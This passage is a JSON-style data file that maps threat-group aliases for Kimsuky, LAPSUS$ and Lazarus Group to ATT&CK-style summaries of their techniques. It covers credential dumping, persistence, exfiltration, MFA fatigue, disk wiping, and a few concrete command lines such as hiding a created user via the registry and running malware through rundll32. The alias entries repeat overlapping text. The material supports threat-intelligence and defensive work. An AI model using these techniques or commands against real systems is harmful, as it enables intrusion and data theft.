    "Black Banshee": "Kimsuky was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019)., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups., , , , , , , Kimsuky has added accounts to specific groups with net localgroup., Kimsuky has used funds from stolen and laundered cryptocurrency to acquire operational infrastructure., Kimsuky has registered domains to spoof targeted organizations and trusted third parties including search engines, web platforms, and cryptocurrency exchanges., Kimsuky has purchased hosting servers with virtual currency and prepaid cards., Kimsuky has hosted content used for targeting efforts via web services such as Blogspot., Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website., Kimsuky  has used HTTP GET and POST requests for C2., Kimsuky has used FTP to download additional malware to the target machine., Kimsuky has used e-mail to send exfiltrated data to C2 servers., Kimsuky has used QuickZip to archive stolen files before exfiltration., Kimsuky has used RC4 encryption before exfil., Kimsuky has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce Registry key., Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies., Kimsuky has executed a variety of PowerShell scripts including Invoke-Mimikatz., Kimsuky has executed Windows commands by using cmd and running batch scripts., Kimsuky has used Visual Basic to download malicious payloads. Kimsuky has also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure., Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data., Kimsuky has used JScript for logging and downloading additional tools., Kimsuky has compromised email accounts to send spearphishing e-mails., Kimsuky has compromised legitimate sites and used them to distribute malware., Kimsuky has created accounts with net user., Kimsuky has created new services for persistence., Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims., Kimsuky has collected Office, PDF, and HWP documents from its victims., Kimsuky has staged collected data files under C:/Program Files/Common Files/System/Ole DB/.",
    "Velvet Chollima": "Kimsuky has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data., Kimsuky has used JScript for logging and downloading additional tools., Kimsuky has compromised email accounts to send spearphishing e-mails., Kimsuky has compromised legitimate sites and used them to distribute malware., Kimsuky has created accounts with net user., Kimsuky has created new services for persistence., Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims., Kimsuky has collected Office, PDF, and HWP documents from its victims., Kimsuky has staged collected data files under C:/Program Files/Common Files/System/Ole DB/., Kimsuky has decoded malicious VBScripts using Base64., Kimsuky created and used a mailing toolkit to use in spearphishing attacks., Kimsuky has developed its own unique malware such as MailFetch.py for use in operations., Kimsuky has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP., Kimsuky has set auto-forward rules on victim's e-mail accounts., Kimsuky has created social media accounts to monitor news and security trends as well as potential targets., Kimsuky has created email accounts for phishing operations., Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents., Kimsuky has exfiltrated data over its C2 channel., Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts., Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688., Kimsuky has used RDP to establish persistence., Kimsuky has the ability to enumerate all files and directories on an infected system., Kimsuky has stolen and laundered cryptocurrency to self-fund operations including the acquisition of infrastructure., Kimsuky has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering., Kimsuky has collected victim employee name information., Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others., Kimsuky has run reg add ‘HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts/UserList’ /v to hide a newly created user., Kimsuky has used an information gathering module that will hide an AV software window from the victim., Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user., Kimsuky has been observed disabling the system firewall., Kimsuky has deleted the exfiltrated data on disk after transmission.",
    "APT43": "Kimsuky has collected valid email addresses including personal accounts that were subsequently used for spearphishing and other forms of social engineering., Kimsuky has collected victim employee name information., Kimsuky has collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others., Kimsuky has run reg add ‘HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts/UserList’ /v to hide a newly created user., Kimsuky has used an information gathering module that will hide an AV software window from the victim., Kimsuky has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user., Kimsuky has been observed disabling the system firewall., Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk., Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics., Kimsuky has downloaded additional scripts, tools, and malware onto victim systems., Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes., Kimsuky has sent internal spearphishing emails for lateral movement after stealing victim information., Kimsuky has disguised services to appear as benign software or related to operating system functions., Kimsuky has renamed malware to legitimate names such as ESTCommon.dll or patch.dll., Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence., Kimsuky has used a proprietary tool to intercept one time passwords required for two-factor authentication., Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols., Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding. Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format., Kimsuky has packed malware with UPX., Kimsuky has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec., Kimsuky has obtained exploit code for various CVEs., Kimsuky has gathered credentials using Mimikatz and ProcDump., Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns., Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain., Kimsuky has used tailored spearphishing emails to gather victim information including contat lists to identify additional targets., Kimsuky has used links in e-mail to steal account information including web beacons for target profiling., Kimsuky can gather a list of all processes running on a victim's machine., Kimsuky has used Win7Elevate to inject malicious code into explorer.exe., Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing., Kimsuky has obtained specific Registry keys and values on a compromised host., Kimsuky has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory., Kimsuky has used a modified TeamViewer client as a command and control channel.",
    "TA427": "Kimsuky has used RDP for direct remote point-and-click access., Kimsuky has downloaded additional malware with scheduled tasks., Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails., Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims., Kimsuky has searched for information on the target company's website., Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding 'Dinosaur' references within the code., Kimsuky has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct., Kimsuky has used compromised and acquired infrastructure to host and deliver malware including Blogspot to host beacons, file exfiltrators, and implants., Kimsuky has signed files with the name EGIS CO,. Ltd.., Kimsuky has used mshta.exe to run malicious scripts on the system., Kimsuky has executed malware with regsvr32s., Kimsuky has used rundll32.exe to execute malicious scripts and malware on a victim's network., Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the 'systeminfo' command., Kimsuky has used ipconfig/all and web beacons sent via email to gather network configuration information., Kimsuky has used an instrumentor script to gather the names of all services running on a victim's system., Kimsuky has used tools that are capable of obtaining credentials from saved mail., Kimsuky has used pass the hash for authentication to remote access software used in C2., Kimsuky has lured victims into clicking malicious links., Kimsuky has used attempted to lure victims into opening malicious e-mail attachments., Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP., Kimsuky has used Blogspot pages for C2.",
    "LAPSUS$": "LAPSUS$ is cyber criminal threat group that has been active since at least mid-2021. LAPSUS$ specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors., , , LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access., LAPSUS$ has used the AD Explorer tool to enumerate users on a victim's network., LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances., LAPSUS$ has used VPS hosting providers for infrastructure., LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials., LAPSUS$ has reconfigured a victim's DNS records to actor-controlled domains and websites., LAPSUS$ has created global admin accounts in the targeted organization's cloud instances to gain persistence., LAPSUS$ has obtained passwords and session tokens with the use of the Redline password stealer., LAPSUS$ has accessed local password managers and databases to obtain further credentials from a compromised network., LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud., LAPSUS$ has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials., LAPSUS$ uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release., LAPSUS$ has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account., LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation., LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. , LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures., LAPSUS$ has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials., LAPSUS$ has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts., LAPSUS$ has gathered detailed knowledge of an organization's supply chain relationships., LAPSUS$ has gathered detailed knowledge of team structures within a target organization., LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts., LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets. , LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process., LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval., LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval., LAPSUS$ acquired and used the Redline password stealer in their operations., LAPSUS$ has obtained tools such as RVTools and AD Explorer for their operations., LAPSUS$ has used Windows built-in tool ntdsutil to extract the Active Directory (AD) database., LAPSUS$ has used DCSync attacks to gather credentials for privilege escalation routines., LAPSUS$ has used the AD Explorer tool to enumerate groups on a victim's network., LAPSUS$ has called victims' help desk to convince the support personnel to reset a privileged account’s credentials., LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims., LAPSUS$ has purchased credentials and session tokens from criminal underground forums., LAPSUS$ has searched public code repositories for exposed credentials., LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure., LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations., LAPSUS$ has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement., LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system., LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs., LAPSUS$ has used compromised credentials to access cloud assets within a target organization.",
    "DEV-0537": "LAPSUS$ specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors., , , LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access., LAPSUS$ has used the AD Explorer tool to enumerate users on a victim's network., LAPSUS$ has added the global admin role to accounts they have created in the targeted organization's cloud instances., LAPSUS$ has used VPS hosting providers for infrastructure., LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials., LAPSUS$ has reconfigured a victim's DNS records to actor-controlled domains and websites., LAPSUS$ has created global admin accounts in the targeted organization's cloud instances to gain persistence., LAPSUS$ has obtained passwords and session tokens with the use of the Redline password stealer., LAPSUS$ has accessed local password managers and databases to obtain further credentials from a compromised network., LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud., LAPSUS$ has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials., LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.",
    "Strawberry Tempest": "LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation., LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. , LAPSUS$ has gathered detailed information of target employees to enhance their social engineering lures., LAPSUS$ has gathered user identities and credentials to gain initial access to a victim's organization; the group has also called an organization's help desk to reset a target's credentials., LAPSUS$ has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts., LAPSUS$ has gathered detailed knowledge of an organization's supply chain relationships., LAPSUS$ has gathered detailed knowledge of team structures within a target organization., LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts., LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets. , LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process., LAPSUS$ has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval., LAPSUS$ has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval., LAPSUS$ acquired and used the Redline password stealer in their operations., LAPSUS$ has obtained tools such as RVTools and AD Explorer for their operations., LAPSUS$ has used Windows built-in tool ntdsutil to extract the Active Directory (AD) database., LAPSUS$ has used DCSync attacks to gather credentials for privilege escalation routines., LAPSUS$ has used the AD Explorer tool to enumerate groups on a victim's network., LAPSUS$ has called victims' help desk to convince the support personnel to reset a privileged account’s credentials., LAPSUS$ has leverage NordVPN for its egress points when targeting intended victims., LAPSUS$ has purchased credentials and session tokens from criminal underground forums., LAPSUS$ has searched public code repositories for exposed credentials., LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure., LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations., LAPSUS$ has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement., LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system., LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs., LAPSUS$ has used compromised credentials to access cloud assets within a target organization.",
    "Lazarus Group": "Lazarus Group is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by Lazarus Group correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups, such as Andariel, APT37, APT38, and Kimsuky.   , , The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA., , , , , , Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context., During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts., Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account., Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels.During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort., During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort., During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools., Lazarus Group has hosted malicious downloads on Github.During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive., During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive., Lazarus Group executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally., Lazarus Group has conducted C2 over HTTP and HTTPS.During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. , During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers. , Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground., Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. , During Operation Dream Job, Lazarus Group archived victim's data into a RAR file., Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server., A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration., Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence. , During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence. , Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user’s Startup folder., Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords., Lazarus Group has used PowerShell to execute commands and malicious code.During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims., During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims., Lazarus Group malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell., During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell., Lazarus Group has used VBA and embedded macros in Word documents to execute malicious code.During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant., During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant., For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure., Lazarus Group has compromised servers to stage malicious tools.For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools., For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools., Several Lazarus Group malware families install themselves as new services., Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory., A Lazarus Group malware sample encodes data with base64., Lazarus Group has collected data and files from compromised networks.During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host., During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host., Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption., Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server., During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers., Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe., Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime., Lazarus Group has developed custom malware for use in their operations.For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations., For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations., During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility., Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory., Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009., Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website., Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic.During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server., Lazarus Group has created new Twitter accounts to conduct social engineering against potential victims.For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts., Lazarus Group has created new email accounts for spearphishing operations.During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt., Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims., Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers., During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers., During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox., Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution., Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again., Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters., During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters., Lazarus Group collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns., Lazarus Group has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets., For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets., During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements., Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application., Lazarus Group has replaced win_fw.dll, an internal component that is executed during IDA Pro installation, with a malicious DLL to download and execute a payload., Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode., Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. , Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. , During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware., Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked., Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility. , Lazarus Group malware has deleted files in various ways, including 'suicide scripts' to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer., During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer., Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files., Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files., Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host., During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host., Lazarus Group malware KiloAlfa contains keylogging functionality., During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization., Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe., Lazarus Group has used a scheduled task named SRCheck to mask the execution of a malicious .dll., Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files., During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection., Lazarus Group has used multi-stage malware components that inject later stages into separate processes., Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server. Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server., Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network., Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches., During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection., Lazarus Group has used a custom hashing method to resolve APIs used in shellcode., Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64., Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli., During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools. , Lazarus Group has obtained SSL certificates for their C2 domains., Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers., During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers., Lazarus Group has sent malicious links to victims via email.During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email., During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email., Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs., During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs., Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down., Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times., A Lazarus Group malware sample performs reflective DLL injection., Lazarus Group has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments., Lazarus Group has used multiple proxies to obfuscate network traffic from victims., Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER/Software/Bitcoin/Bitcoin-Qt., Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime., Lazarus Group malware SierraCharlie uses RDP for propagation., Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement., Lazarus Group used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network., Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script., During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script., For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization., During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components., Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users., For Operation Dream Job, Lazarus Group used compromised servers to host malware., For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools., Lazarus Group has digitally signed malware and utilities to evade detection.During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection., During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection., Lazarus Group lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL., Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents., During Operation Dream Job, Lazarus Group used regsvr32 to execute malware., Lazarus Group has used rundll32 to execute malicious payloads on a compromised host.During Operation Dream Job, Lazarus Group executed malware with C://windows/system32/rundll32.exe 'C:/ProgramData/ThumbNail/thumbnail.db', CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905., During Operation Dream Job, Lazarus Group executed malware with C://windows/system32/rundll32.exe 'C:/ProgramData/ThumbNail/thumbnail.db', CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905., Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server., During 